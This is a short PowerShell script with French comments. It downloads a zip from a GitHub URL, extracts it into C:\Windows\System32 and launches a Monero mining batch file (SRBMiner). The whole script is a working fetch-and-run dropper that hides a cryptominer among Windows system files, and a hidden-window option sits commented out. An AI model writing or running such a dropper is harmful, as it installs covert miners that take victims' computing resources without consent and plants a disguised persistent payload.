


# Source file location
$source = 'https://github.com/abyeli/miner/raw/main/Miner.zip' 

# Destination to save the file
$destination = 'C:\Windows\bcastdvr\Miner.zip'

#Download the file
Invoke-RestMethod -Uri $source -OutFile $destination

#extraire un fichier zip vers une destination FONCTIONNE :) Ajout du -Wait pour attendre fin du processus
Expand-Archive -LiteralPath 'C:\Windows\bcastdvr\Miner.zip' -DestinationPath 'C:\Windows\System32' 

#lancer le bat FONCTIONNE :)
$A = Start-Process -FilePath 'C:\Windows\System32\SRBMiner-Multi-0-9-4\start_monero.bat' -Wait #-WindowStyle Hidden